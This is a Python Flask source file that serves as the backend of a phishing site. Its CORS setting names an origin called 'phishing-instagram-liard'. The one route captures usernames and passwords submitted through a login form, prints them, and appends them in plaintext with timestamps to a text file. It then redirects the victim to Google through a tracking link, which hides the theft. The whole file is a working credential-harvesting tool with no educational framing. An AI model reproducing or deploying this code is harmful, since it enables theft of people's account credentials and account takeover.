from flask import Flask, render_template, request, redirect
from datetime import datetime
from flask_cors import CORS


app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": ["https://phishing-instagram-liard.vercel.app/"]}})

@app.route("/", methods=['GET', 'POST'])
def hello_world():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"login attempt - Username: {username}\nPassword: {password}")
        
    
        with open('create.txt', 'a') as f:
            f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")
            
        print(f"Login attempt saved - Username: {username}")
        print(f"Login attempt saved - password: {password}")
    
        return redirect("https://www.bing.com/ck/a?!&&p=d0a136b08a75752eb75f23cd5f09c07461711c07458b9188b3593200362d901eJmltdHM9MTc1OTAxNzYwMA&ptn=3&ver=2&hsh=4&fclid=0ce08f83-a7fe-62cb-26bf-9e72a609639f&psq=google&u=a1aHR0cHM6Ly93d3cuZ29vZ2xlLmNvLmluLw")
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True, port=1111)


